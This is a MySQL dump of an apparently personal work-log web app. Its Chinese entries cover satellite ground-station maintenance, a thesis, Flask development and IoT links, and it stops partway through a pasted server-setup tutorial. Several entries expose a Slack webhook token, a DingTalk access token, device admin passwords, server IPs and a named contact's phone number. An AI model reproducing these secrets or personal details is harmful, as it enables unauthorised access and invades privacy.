-- MySQL dump 10.13  Distrib 5.7.20, for Linux (x86_64)
--
-- Host: localhost    Database: log
-- ------------------------------------------------------
-- Server version	5.7.20-0ubuntu0.16.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `logs`
--

DROP TABLE IF EXISTS `logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `author` varchar(100) NOT NULL,
  `body` mediumtext NOT NULL,
  `create_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `title` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  FULLTEXT KEY `author` (`author`,`body`),
  FULLTEXT KEY `author_2` (`author`,`body`),
  FULLTEXT KEY `author_3` (`author`,`body`),
  FULLTEXT KEY `author_4` (`author`,`body`)
) ENGINE=InnoDB AUTO_INCREMENT=94 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `logs`
--

LOCK TABLES `logs` WRITE;
/*!40000 ALTER TABLE `logs` DISABLE KEYS */;
INSERT INTO `logs` VALUES (1,'yebin','<p>普通用户新建日志测试一。</p>\r\n\r\n<p>编辑测试。</p>\r\n','2017-11-11 16:38:15','普通用户新建日志测试一'),(2,'yebin','<p>普通用户新建日志测试二。</p>\r\n','2017-11-11 16:38:40','普通用户新建日志测试二'),(3,'yebin','<p>普通用户新建日志测试三。</p>\r\n','2017-11-11 16:38:52','普通用户新建日志测试三'),(4,'admin','<p>新建管理员日志测试一。</p>\r\n\r\n<p>编辑测试。</p>\r\n','2017-11-11 17:39:45','新建管理员日志测试一'),(5,'admin','<p>新建管理员日志测试二。</p>\r\n','2017-11-11 17:40:00','新建管理员日志测试二'),(6,'admin','<p>新建管理员日志测试三。</p>\r\n','2017-11-11 17:40:12','新建管理员日志测试三'),(14,'yebin','<p>用手机发布日志测试。</p>\r\n','2017-11-11 19:31:07','用手机发布日志测试'),(16,'yebin','<p>数据库表数据提取翻页显示测试。</p>\r\n','2017-11-13 03:06:40','数据库表数据提取翻页显示测试'),(17,'admin','<p>管理员日志删除和日志翻页测试。</p>\r\n','2017-11-13 03:07:25','管理员日志删除和日志翻页测试'),(18,'admin','<p>翻页测试二。</p>\r\n','2017-11-13 03:07:43','翻页测试二'),(19,'yebin','<p>翻页测试二。</p>\r\n','2017-11-13 03:08:03','翻页测试二'),(20,'admin','<p>导航增加新建按钮。</p>\r\n','2017-11-13 06:57:54','导航增加新建按钮'),(21,'yebin','<p>工作日志项目增加翻页功能，增加删除用户和删除日志的确认功能。</p>\r\n','2017-11-13 10:42:35','工作日志项目增加翻页、删除用户和删除日志功能'),(22,'yebin','<p>1. 上海新收犯监狱维护。</p>\r\n\r\n<p>2. 安装windows7到办公机，配置为双启动，并将linux分区下的工作文件转移至windows分区。</p>\r\n','2017-11-14 10:30:25','新收监维护 - 20171114'),(23,'yebin','<p>1、放弃nginx反向代理https服务，弃用uWSGI；</p>\r\n\r\n<p>2、直接采用systemd的service托管flask网站；</p>\r\n\r\n<p>3、在flask内部启用ssl（mainpage项目）；</p>\r\n\r\n<p>4、增加小站监控登录列，在用户名称上悬浮显示管理IP。</p>\r\n','2017-11-15 15:34:50','优化小站监控和托管服务'),(24,'yebin','<p>为日志项目和小站项目增加翻页功能，小站在线监控翻页功能暂未完成。</p>\r\n','2017-11-16 10:03:02','增加翻页功能'),(25,'yebin','<p>1、完成小站在线状态页面的翻页的功能；</p>\r\n\r\n<p>2、增加域名解析：doc.satelc.com，端口为 8021；</p>\r\n\r\n<p>3、将卫星远端站综合管理首页由域名 myblog.satelc.com 改为 satelc.com；</p>\r\n\r\n<p>4、在小站在线状态页面增加总小站数、总在线数、当前页面小站数和当前页面在线数。</p>\r\n','2017-11-17 08:44:51','修改域名及增加翻页'),(26,'yebin','<p>关于数据库搜索的几个参考链接：</p>\r\n\r\n<ul>\r\n	<li><a href=\"https://www.v2ex.com/t/274600\" target=\"_blank\">请问 Flask-WhooshAlchemy 支持中文检索是有问题吗？</a></li>\r\n	<li><a href=\"https://github.com/Revolution1/Flask-WhooshAlchemyPlus\" target=\"_blank\">Flask-WhooshAlchemyPlus</a></li>\r\n	<li><a href=\"https://github.com/bkabrda/flask-whooshee\" target=\"_blank\">Flask-Whooshee</a></li>\r\n	<li><a href=\"https://blog.miguelgrinberg.com/post/the-flask-mega-tutorial-part-x-full-text-search\" target=\"_blank\">The Flask Mega-Tutorial, Part X: Full Text Search</a></li>\r\n	<li><a href=\"https://stackoverflow.com/questions/28786515/two-ways-of-creating-a-flask-sqlalchemy-basequery-object-only-one-works-why\" target=\"_blank\">Two ways of creating a flask-SQLAlchemy BaseQuery object - only one works, why?</a></li>\r\n</ul>\r\n','2017-11-20 15:34:40','关于数据库搜索的几个参考链接'),(27,'yebin','<p>分别为普通用户和管理员增加数据库模糊查询以及查询结果分页显示功能，每次查询将查询关键字保存到全局变量以实现分页。</p>\r\n','2017-11-21 09:59:58','增加按用户类别查询的功能'),(28,'yebin','<p>1、增加myblog的查询功能；</p>\r\n\r\n<p>2、用js实现下拉菜单，实现在特定范围内查询，包括小站和公告；</p>\r\n\r\n<p>3、将查询结果的html页面的jinja2跳转由flask的路由改为url_for，排除单击下一页后点击条目无法进入对应页面的bug；</p>\r\n\r\n<p>4、将每种查询范围对应的路由函数的名称通过变量传递给jinja2前端，实现翻页功能动态获取当前查询函数路由的功能。</p>\r\n','2017-11-22 06:36:46','增加 myblog 查询功能'),(29,'yebin','<p>2017-11-23（补）</p>\r\n\r\n<p>1. 将树莓派的温度每隔一分钟写入到数据库；</p>\r\n\r\n<p>2. 修改论文，将所有&ldquo;段后6&rdquo;改为&ldquo;段后0&rdquo;。</p>\r\n','2017-11-23 23:56:03','修改论文 - 20171123'),(30,'yebin','<p>1. 金山民防办维护，天线极化电机故障，垂直极化信标改为953兆赫；</p>\r\n\r\n<p>2. 初步实现小站监控温度实时显示，需改善的是增加温度所属单位。</p>\r\n','2017-11-24 10:50:48','金山民防维护 - 20171124'),(31,'yebin','<p>修复小站在线状态中温度显示的bug，现在该功能可以实时显示每个用户终端的温度。</p>\r\n','2017-11-24 17:33:21','修复小站温度显示 Bug'),(32,'yebin','<p>1. 增加微信公众号关键字自动回复功能，发送用户终端名，回复终端在线状态和设备温度；</p>\r\n\r\n<p>2. 完成小站在线状态和温度的实时监控；</p>\r\n\r\n<p>3. 终端（Pi3）脚本待备份；</p>\r\n\r\n<p>4. 备份源代码（待办）。</p>\r\n','2017-11-26 14:01:51','增加微信公众号关键字回复功能'),(33,'yebin','<p>湖北无委项目：</p>\r\n\r\n<p>1. 培训及考试方案；</p>\r\n\r\n<p>2. 无人机安装及4G安装；</p>\r\n\r\n<p>3. 黄石地面站功放安装及卫星通信调试。</p>\r\n\r\n<p>崇明民防：</p>\r\n\r\n<p>1. 发电机保养；</p>\r\n\r\n<p>2. 例行维护。</p>\r\n\r\n<p>虹口民防：发电机保养，用户有费用疑问，需要向项目经理确认。</p>\r\n\r\n<p>硕士论文：</p>\r\n\r\n<p>1. 增加实时温度显示；</p>\r\n\r\n<p>2. 增加微信公众平台接入；</p>\r\n\r\n<p>3. 增加查询；</p>\r\n\r\n<p>4. 控制器增加数据库和 web request post 脚本；</p>\r\n\r\n<p>5. 修正参考文件引用序号；</p>\r\n\r\n<p>6. 增加三个系统设计结构图；</p>\r\n\r\n<p>7. 增加第四章树莓派等外设图的文字描述；</p>\r\n\r\n<p>8. 图形裁边；</p>\r\n\r\n<p>9. 断后格式改为 0 磅。</p>\r\n\r\n<p>论文待办：</p>\r\n\r\n<p>1. 修改英文摘要；</p>\r\n\r\n<p>2. 查重。</p>\r\n','2017-11-28 09:33:35','硕士论文中增加微信公众平台接入模块 - 20171128'),(34,'yebin','<p>1. 诺特和上海监狱的合同已签，需要发OA采购申请，向蓝波采购发射机；</p>\r\n\r\n<p>2. 湖北无委无人机视频转换设备须加上服务费，约1300元，由我方负责采购；</p>\r\n\r\n<p>3. 学费已交；</p>\r\n\r\n<p>4. 考虑更换上海移动4G套餐；</p>\r\n\r\n<p>5. 为mainpage项目增加翻页功能，优化不同用户显示不同文档功能代码，查询功能待增加。</p>\r\n','2017-11-29 07:36:44','交学费 - 20171129'),(35,'yebin','<p>1. 湖北无委项目：</p>\r\n\r\n<p>已联系冠艺（HDMI无线传输）张经理，确定采购清单，由我方进行采购和安装。</p>\r\n\r\n<p>2. 民防：</p>\r\n\r\n<p>长宁和崇明民防下周四之前维护，周四演练，长宁10至12月的维护单；</p>\r\n\r\n<p>虹口民防发电机保养待办。</p>\r\n\r\n<p>3. mainpage 项目：</p>\r\n\r\n<p>增加用户文档显示页面的翻页功能；</p>\r\n\r\n<p>增加按文档标题和按文档内容搜索功能。</p>\r\n\r\n<p>4. 增加cgi模块，对搜索关键字进行转义，防止sql注入式攻击。</p>\r\n','2017-11-30 06:58:54','增加 cgi 模块'),(36,'yebin','<p>需变更还原项：</p>\r\n\r\n<p>测试条目中，台式机变更为了上海消防地面站。</p>\r\n','2017-11-30 08:35:20','变更测试机小站名称'),(37,'yebin','<p>昨晚对小站监控的温度显示进行了修复，排除基本故障。但是由于浏览器每次访问时才对监控页面发出请求，所以会出现页面刚出现时某些站的温度没有显示，可以对显示数据的获取作进一步优化，如不采用小站推送温度数据直接显示，而采用通过数据库读取数据显示，或者在温度推送前对温度值进行初始化操作。</p>\r\n','2017-11-30 23:05:18','排除小站温度显示故障 - 20171201'),(38,'yebin','<p>2017年12月6日：</p>\r\n\r\n<p>1、长宁民防维护，调整天控器信标参数；</p>\r\n\r\n<p>2、静安民防维护，调整KVM。</p>\r\n','2017-12-19 09:28:12','长宁和静安民防维护 - 20171206'),(39,'yebin','<p>2017年12月8日：</p>\r\n\r\n<p>湖北无委项目通信指挥车状态检查，原车电瓶无法启动车辆，用充电器给原车电瓶充电后恢复。</p>\r\n\r\n<p>注意：引擎盖内的电瓶不是发动机启动电瓶，是原车辅助电瓶。发电机启动电瓶在驾驶位下方的铁板内。</p>\r\n\r\n<p>启动车载发电机，给发电机电瓶和UPS电瓶充电。</p>\r\n','2017-12-19 09:31:13','湖北无委维护 - 20171208'),(40,'yebin','<p>2017年12月9日：</p>\r\n\r\n<p>1、去黄石无委取修好的卫星功放；</p>\r\n\r\n<p>2、去黄石地面站安装功放，并测试，结果运行正常；</p>\r\n\r\n<p>3、部署远程监控终端，修改570L的串口远程通信参数。</p>\r\n','2017-12-19 09:34:03','湖北无委黄石地面站功放安装 - 20171209'),(41,'yebin','<p>2017年12月10日：</p>\r\n\r\n<p>1、准备湖北无委培训文档；</p>\r\n\r\n<p>2、准备湖北无委操作文档。</p>\r\n','2017-12-19 09:35:04','编写湖北无委培训文档 - 20171210'),(42,'yebin','<p>2017年12月11日：</p>\r\n\r\n<p>1、上午部署湖北无委会议中心；</p>\r\n\r\n<p>2、下午勘察演练现场。</p>\r\n','2017-12-19 09:37:22','湖北无委预演 - 20171211'),(43,'yebin','<p>2017年12月12日：</p>\r\n\r\n<p>演练现场操作培训，安排演练流程，测试所有设备，排除所有故障。</p>\r\n\r\n<p>关于4G机动宽带：</p>\r\n\r\n<p>http://192.168.90.129:2323/dss_90/client/#</p>\r\n\r\n<p>http://192.168.90.129:2323/ietc_80/client/#</p>\r\n\r\n<p>admin<br />\r\nNULL</p>\r\n\r\n<p>show hssauthdata<br />\r\nshow hsduserdata<br />\r\nshow dssuserdata</p>\r\n\r\n<p>sync</p>\r\n\r\n<p>http://192.168.90.55/dispatcher/controller</p>\r\n\r\n<p>admin<br />\r\n111111</p>\r\n\r\n<p>工控机显卡故障</p>\r\n','2017-12-19 09:38:19','湖北无委演练前准备 - 20171212'),(44,'yebin','<p>2017年12月13日：</p>\r\n\r\n<p>湖北无委荷田酒店会议厅理论培训。</p>\r\n','2017-12-19 09:38:40','湖北无委培训 - 20171213'),(45,'yebin','<p>2017年12月14日：</p>\r\n\r\n<p>正式演练。</p>\r\n\r\n<p>中心频率：1141</p>\r\n\r\n<p>带宽：4M</p>\r\n\r\n<p>车：<br />\r\ntx: 1140<br />\r\nrx: 1142</p>\r\n\r\n<p>地面站：<br />\r\ntx: 1142<br />\r\nrx: 1140</p>\r\n','2017-12-19 09:40:46','湖北无委演练 - 20171214'),(46,'yebin','<p>2017年12月15日：</p>\r\n\r\n<p>湖北无委演练后的收尾工作，包括再次培训和文档整理等。</p>\r\n\r\n<p>另：</p>\r\n\r\n<p>增加一台服务器：111.47.20.166（中国移动）</p>\r\n\r\n<p>域名：hxwulian.cn</p>\r\n\r\n<p>用户名：yebin</p>\r\n\r\n<p>密码：同原服务器配置。</p>\r\n','2017-12-19 09:43:53','湖北无委演练后培训和整理 - 20171215'),(47,'yebin','<p>2017年12月25日</p>\r\n\r\n<p>崇明民防维护：</p>\r\n\r\n<p>1、支撑脚控制器偶尔不灵；</p>\r\n\r\n<p>2、发电机电瓶需要外接电瓶才能启动；</p>\r\n\r\n<p>3、下次每两个月做一次维护，带维护报告；</p>\r\n\r\n<p>4、发电机待保养。</p>\r\n','2017-12-26 13:29:37','崇明民防维护 - 20171225'),(48,'yebin','<p>服务器：</p>\r\n\r\n<p>品牌：Lenovo 联想</p>\r\n\r\n<p>型号：万全 R680 G7</p>\r\n\r\n<p>配置：SAS RAID</p>\r\n\r\n<p>电源：AC200-240V 50Hz 14A</p>\r\n\r\n<p>生产日期：2011年08月12日</p>\r\n\r\n<p>SO 号：0005989424</p>\r\n\r\n<p>服务网址：http://support.lenovo.com.cn</p>\r\n\r\n<p>出厂编号：NC00731230</p>\r\n\r\n<p>联想（北京）有限公司</p>\r\n','2017-12-27 09:05:34','华讯物联服务器配置'),(49,'yebin','<p>维修新收监iPad2：</p>\r\n\r\n<p>1、更换外屏；</p>\r\n\r\n<p>2、重置系统；</p>\r\n\r\n<p>3、检测电池；</p>\r\n\r\n<p>4、删除用户（钱树博）。</p>\r\n','2017-12-29 08:55:09','新收监维修中控'),(50,'yebin','<p>About IoT:</p>\r\n\r\n<p>https://thinger.io/</p>\r\n\r\n<p>https://www.pega.com/</p>\r\n\r\n<p>https://open.iot.10086.cn/</p>\r\n\r\n<p>http://cloud.usr.cn/</p>\r\n\r\n<p>http://iot.open.qq.com/</p>\r\n\r\n<p>http://qinfei.glrsmart.com/2017/07/18/linuxchun-jiao-ben-shi-xian-mqttyu-chuan-kou-tou-chuan/</p>\r\n\r\n<p>树莓派USB转串口：</p>\r\n\r\n<p>http://www.voidcn.com/article/p-ghniinor-ss.html</p>\r\n\r\n<p>物联网：</p>\r\n\r\n<p>IoT(TICK):&nbsp;Telegraf, InfluxDB,&nbsp;Chronograf,&nbsp;Kapacitor</p>\r\n\r\n<p>IoT Stack:</p>\r\n\r\n<p>Mosca - MQTT Broker</p>\r\n\r\n<p>Telegraf - Ingestion Engine</p>\r\n\r\n<p>InfluxDB - Time-Seriers Database</p>\r\n\r\n<p>Chronograf - Dashboard</p>\r\n\r\n<p>Node-Red - Rules Engine</p>\r\n\r\n<p>Popular: LoRa / NB-IoT</p>\r\n','2018-01-03 05:27:44','About IoT'),(51,'yebin','<p>The Flask Mega-Tutorial, Part XI: Email Support:</p>\r\n\r\n<p>https://blog.miguelgrinberg.com/post/the-flask-mega-tutorial-part-xi-email-support-legacy</p>\r\n\r\n<p>Open Source Time Series Platform:</p>\r\n\r\n<p>https://www.influxdata.com/time-series-platform/</p>\r\n\r\n<p>IoT influxdata documents:</p>\r\n\r\n<p><a href=\"https://docs.influxdata.com/\" target=\"_blank\">https://docs.influxdata.com/</a></p>\r\n\r\n<p>-------------------------------------</p>\r\n\r\n<p>Workspace Name &amp; URL：<br />\r\nYour workspace name is fly and your URL is https://flycrew.slack.com.<br />\r\nWebhook URL：<br />\r\nhttps://hooks.slack.com/services/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<br />\r\nSending Messages：<br />\r\nYou have two options for sending data to the Webhook URL above:<br />\r\nSend a JSON string as the payload parameter in a POST request<br />\r\nSend a JSON string as the body of a POST request<br />\r\nFor a simple message, your JSON payload could contain a text property at minimum. This is the text that will be posted to the channel.<br />\r\nA simple example:<br />\r\npayload={&quot;text&quot;: &quot;This is a line of text in a channel.\\nAnd this is another line of text.&quot;}</p>\r\n','2018-01-04 01:38:25','Open Source Time Series Platform'),(52,'yebin','<p>How&nbsp;To&nbsp;Monitor&nbsp;System&nbsp;Metrics&nbsp;with&nbsp;the&nbsp;TICK&nbsp;Stack&nbsp;on&nbsp;Ubuntu&nbsp;16.04&nbsp;|&nbsp;DigitalOcean:</p>\r\n\r\n<p>https://www.digitalocean.com/community/tutorials/how-to-monitor-system-metrics-with-the-tick-stack-on-ubuntu-16-04</p>\r\n\r\n<p>How&nbsp;to&nbsp;install&nbsp;and&nbsp;configure&nbsp;Node-RED&nbsp;on&nbsp;Ubuntu&nbsp;16.04&nbsp;|&nbsp;DigitalOcean:</p>\r\n\r\n<p>https://www.digitalocean.com/community/tutorials/how-to-connect-your-internet-of-things-with-node-red-on-ubuntu-16-04</p>\r\n\r\n<p>MQTT Publish-Python MQTT Client Examples:</p>\r\n\r\n<p>http://www.steves-internet-guide.com/publishing-messages-mqtt-client/</p>\r\n\r\n<p>----------------------------------</p>\r\n\r\n<p>Some ports:</p>\r\n\r\n<p>influx:</p>\r\n\r\n<p>http://111.47.20.166:8888</p>\r\n\r\n<p>telegraf: 8086</p>\r\n\r\n<p>InfluxDB HTTP service: 8086</p>\r\n\r\n<p>&nbsp;RPC service for backup and restore: 8088</p>\r\n\r\n<p>kapacitor: 9092</p>\r\n\r\n<p>mosquitto: 1883</p>\r\n\r\n<p>node-red: 1880</p>\r\n\r\n<p>Thinger.io: 8022</p>\r\n\r\n<p>mongodb: 27017 (sudo lsof -i -ac mongod)</p>\r\n','2018-01-04 04:41:17','TICK Stack Node-RED MQTT'),(53,'yebin','<p>https://thingsboard.io/docs/reference/mqtt-api/</p>\r\n\r\n<p>http://docs.thinger.io/linux/</p>\r\n\r\n<p><a href=\"https://open.iot.10086.cn/\" target=\"_blank\">https://open.iot.10086.cn/</a></p>\r\n\r\n<p>基于Kubernetes和OpenStack的开源项目在物联网的应用：</p>\r\n\r\n<p>https://my.oschina.net/caicloud/blog/682968</p>\r\n\r\n<p>用于IoT应用程序开发的10大开源软件:</p>\r\n\r\n<p>http://iot.it168.com/a2017/0315/3104/000003104932.shtml</p>\r\n\r\n<p>https://devicehub.net/</p>\r\n\r\n<p>http://documentation.sitewhere.io/overview.html</p>\r\n\r\n<p>https://docs.particle.io/guide/getting-started/intro/raspberry-pi/</p>\r\n\r\n<p>https://thingspeak.com/</p>\r\n\r\n<p>http://www.openremote.com/community/</p>\r\n\r\n<p>https://www.kaaproject.org/getting-started/</p>\r\n\r\n<p>https://devicehive.com/</p>\r\n','2018-01-08 02:19:47','Thinger IO'),(54,'yebin','<p>钉钉机器人（卫星终端控制器报警机器人）webhook：</p>\r\n\r\n<p>https://oapi.dingtalk.com/robot/send?access_token=14954f5339c168f1f0089b295104dd36bb38796bcedb2b46761d74230cef5228</p>\r\n\r\n<p>Python socket network programming:</p>\r\n\r\n<p>https://pythontips.com/2013/08/06/python-socket-network-programming/</p>\r\n\r\n<p>PYHEARTBEAT - DETECTING INACTIVE COMPUTERS (PYTHON RECIPE):</p>\r\n\r\n<p>https://code.activestate.com/recipes/52302-pyheartbeat-detecting-inactive-computers/</p>\r\n','2018-01-09 01:20:42','Webhook And Heartbeat'),(55,'yebin','<p>海康威视：</p>\r\n\r\n<p>在线帮助中心：www.hikvision.com/cn/support_list_55.html</p>\r\n\r\n<p>电话：0571-88075998 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>\r\n\r\n<p>技术服务微信：海康威视客户服务</p>\r\n\r\n<p>邮箱：market@hikvision.com &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>\r\n\r\n<p>技术服务电话：400-700-5998</p>\r\n\r\n<p>传真：0571-88805843 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>\r\n\r\n<p>技术服务邮箱：400@hikvision.com</p>\r\n\r\n<p>邮编：310051 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p>\r\n\r\n<p>官方通讯地址：杭州市滨江区阡陌路555号</p>\r\n','2018-01-10 03:24:06','海康官网及电话'),(56,'yebin','<p>关于 thinger.io 自建平台：</p>\r\n\r\n<p>http://111.47.20.166:8022/#/settings</p>\r\n\r\n<p>每次从一个新的地方访问时，要配置一下。在第一个输入框的IP地址后面加上端口号&ldquo;:8022&rdquo;，然后点击&ldquo;Update&rdquo;，再点击&ldquo;Back to the Application&rdquo;，然后用创建的账号就可以登录。</p>\r\n\r\n<p>原因是这个平台默认是80端口，因为没有备案，在后台配置文件中改成了8022端口，所以每次从一个新的电脑登录，都要配置一下登录的端口号。</p>\r\n\r\n<p>关于 thinger.io 项目：</p>\r\n\r\n<p>https://hackaday.io/project/6329-open-source-iot-platform-thingerio/details</p>\r\n\r\n<p>https://github.com/thinger-io</p>\r\n','2018-01-10 13:23:34','关于 thinger.io 自建平台'),(57,'yebin','<p>服务器数据库备份参考链接（139.224.114.83）：</p>\r\n\r\n<p>https://simon-davies.name/bash/backing-up-mysql-databases</p>\r\n\r\n<p>---------------------------------------------------------------------</p>\r\n\r\n<p>湖北省武汉市武昌区尚隆路60号</p>\r\n\r\n<p>430060</p>\r\n\r\n<p>宋智勇</p>\r\n\r\n<p>18008629130</p>\r\n\r\n<p>湖北省无线电管理委员会办公室</p>\r\n','2018-01-11 03:20:50','服务器数据库备份参考链接及湖北无委地址'),(58,'yebin','<p>树莓派等单片机的传感器资源：</p>\r\n\r\n<p>http://www.circuitbasics.com/</p>\r\n\r\n<p>---------------------------------------</p>\r\n\r\n<p>Tutorial: IOT / Installing and Testing Mosquitto MQTT on the Raspberry Pi:</p>\r\n\r\n<p>http://www.switchdoc.com/2016/02/tutorial-installing-and-testing-mosquitto-mqtt-on-raspberry-pi/</p>\r\n\r\n<p>MQTT Tutorial for Raspberry Pi, Arduino, and ESP8266:</p>\r\n\r\n<p>https://www.baldengineer.com/mqtt-tutorial.html</p>\r\n\r\n<p>------------------------------------</p>\r\n\r\n<p>Python MQTT Client:</p>\r\n\r\n<p>http://www.steves-internet-guide.com/publishing-messages-mqtt-client/</p>\r\n\r\n<p>http://www.steves-internet-guide.com/into-mqtt-python-client/</p>\r\n\r\n<p>http://www.steves-internet-guide.com/python-mqtt-publish-subscribe/</p>\r\n\r\n<p>----------------------------------------</p>\r\n\r\n<p>Temperature upload over MQTT using Raspberry Pi and DHT22 sensor:</p>\r\n\r\n<p>https://thingsboard.io/docs/samples/raspberry/temperature/</p>\r\n','2018-01-11 07:42:44','树莓派等单片机的传感器资源'),(59,'yebin','<p>IoT Resources:</p>\r\n\r\n<p>http://www.circuitbasics.com/</p>\r\n\r\n<p>https://www.andymelichar.com/2017/02/26/iot-data-management-with-the-tig-stack/#more-159</p>\r\n\r\n<p>http://www.svtechie.com/index.php/2017/03/11/iot-connectivity-time-series-storage/</p>\r\n','2018-01-15 07:20:45','IoT Resources'),(60,'yebin','<p>How&nbsp;To&nbsp;Install&nbsp;Linux,&nbsp;Nginx,&nbsp;MySQL,&nbsp;PHP&nbsp;(LEMP&nbsp;stack)&nbsp;in&nbsp;Ubuntu&nbsp;16.04:</p>\r\n\r\n<p>https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-in-ubuntu-16-04</p>\r\n\r\n<p>完整的flask建站实例：Converting&nbsp;a&nbsp;simple&nbsp;website&nbsp;to&nbsp;Python&nbsp;Flask:</p>\r\n\r\n<p>http://vertstudios.com/blog/new-flask-site/</p>\r\n','2018-01-17 05:29:44','How To Install Linux, Nginx, MySQL, PHP (LEMP stack) in Ubuntu 16.04'),(61,'yebin','<p>倒车影像：</p>\r\n\r\n<p>https://item.jd.com/10651699771.html</p>\r\n\r\n<p>崇明民防发电机：康明斯QD8000</p>\r\n','2018-01-17 09:03:38','倒车影像'),(62,'yebin','<p>上海市斜土路768号致远大厦25楼O座</p>\r\n\r\n<p>021-6303 2788</p>\r\n\r\n<p>上海弛邦电子</p>\r\n\r\n<p>----------------------------------------------------</p>\r\n\r\n<p>Introduction to accessing the Raspberry Pi&#39;s GPIO in C++ (sysfs):</p>\r\n\r\n<p>http://hertaville.com/introduction-to-accessing-the-raspberry-pis-gpio-in-c.html</p>\r\n\r\n<p>Raspberry Pi Starter Kit Lesson 17: Raspberry Pi Works with DHT11 Temperature and Humidity Module：</p>\r\n\r\n<p>http://osoyoo.com/2017/07/06/dht11/</p>\r\n\r\n<p>&nbsp;</p>\r\n','2018-01-19 06:00:52','Raspberry Pi Works with DHT11 Temperature and Humidity Module'),(63,'yebin','<p>How&nbsp;To&nbsp;Serve&nbsp;Flask&nbsp;Applications&nbsp;with&nbsp;uWSGI&nbsp;and&nbsp;Nginx&nbsp;on&nbsp;Ubuntu&nbsp;16.04&nbsp;|&nbsp;DigitalOcean:</p>\r\n\r\n<p>https://www.digitalocean.com/community/tutorials/how-to-serve-flask-applications-with-uwsgi-and-nginx-on-ubuntu-16-04</p>\r\n\r\n<p>PostedMay 19, 2016 95.5k views <a href=\"https://www.digitalocean.com/community/tags/python?type=tutorials\">Python</a> <a href=\"https://www.digitalocean.com/community/tags/python-frameworks?type=tutorials\">Python Frameworks</a> <a href=\"https://www.digitalocean.com/community/tags/nginx?type=tutorials\">Nginx</a> <a href=\"https://www.digitalocean.com/community/tags/ubuntu?type=tutorials\">Ubuntu</a> <a href=\"https://www.digitalocean.com/community/tags/ubuntu-16-04?type=tutorials\">Ubuntu 16.04</a></p>\r\n\r\n<h3>Introduction</h3>\r\n\r\n<p>In this guide, we will be setting up a simple Python application using the Flask micro-framework on Ubuntu 16.04. The bulk of this article will be about how to set up the uWSGI application server to launch the application and Nginx to act as a front end reverse proxy.</p>\r\n\r\n<h2>Prerequisites</h2>\r\n\r\n<p>Before starting on this guide, you should have a non-root user configured on your server. This user needs to have <code>sudo</code> privileges so that it can perform administrative functions. To learn how to set this up, follow our <a href=\"https://www.digitalocean.com/community/tutorials/initial-server-setup-with-ubuntu-16-04\">initial server setup guide</a>.</p>\r\n\r\n<p>To learn more about uWSGI, our application server and the WSGI specification, you can read the linked section of <a href=\"https://www.digitalocean.com/community/tutorials/how-to-set-up-uwsgi-and-nginx-to-serve-python-apps-on-ubuntu-14-04#definitions-and-concepts\">this guide</a>. Understanding these concepts will make this guide easier to follow.</p>\r\n\r\n<p>When you are ready to continue, read on.</p>\r\n\r\n<h2>Install the Components from the Ubuntu Repositories</h2>\r\n\r\n<p>Our first step will be to install all of the pieces that we need from the repositories. We will install <code>pip</code>, the Python package manager, in order to install and manage our Python components. We will also get the Python development files needed to build uWSGI and we&#39;ll install Nginx now as well.</p>\r\n\r\n<p>We need to update the local package index and then install the packages. The packages you need depend on whether your project uses Python 2 or Python 3.</p>\r\n\r\n<p>If you are using <strong>Python 2</strong>, type:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo apt-get update </code></li>\r\n	<li><code>sudo apt-get install python-pip python-dev nginx </code></li>\r\n</ul>\r\n\r\n<p>If, instead, you are using <strong>Python 3</strong>, type:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo apt-get update </code></li>\r\n	<li><code>sudo apt-get install python3-pip python3-dev nginx </code></li>\r\n</ul>\r\n\r\n<h2>Create a Python Virtual Environment</h2>\r\n\r\n<p>Next, we&#39;ll set up a virtual environment in order to isolate our Flask application from the other Python files on the system.</p>\r\n\r\n<p>Start by installing the <code>virtualenv</code> package using <code>pip</code>.</p>\r\n\r\n<p>If you are using <strong>Python 2</strong>, type:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo pip install virtualenv </code></li>\r\n</ul>\r\n\r\n<p>If you are using <strong>Python 3</strong>, type:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo pip3 install virtualenv </code></li>\r\n</ul>\r\n\r\n<p>Now, we can make a parent directory for our Flask project. Move into the directory after you create it:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>mkdir ~/myproject </code></li>\r\n	<li><code>cd ~/myproject </code></li>\r\n</ul>\r\n\r\n<p>We can create 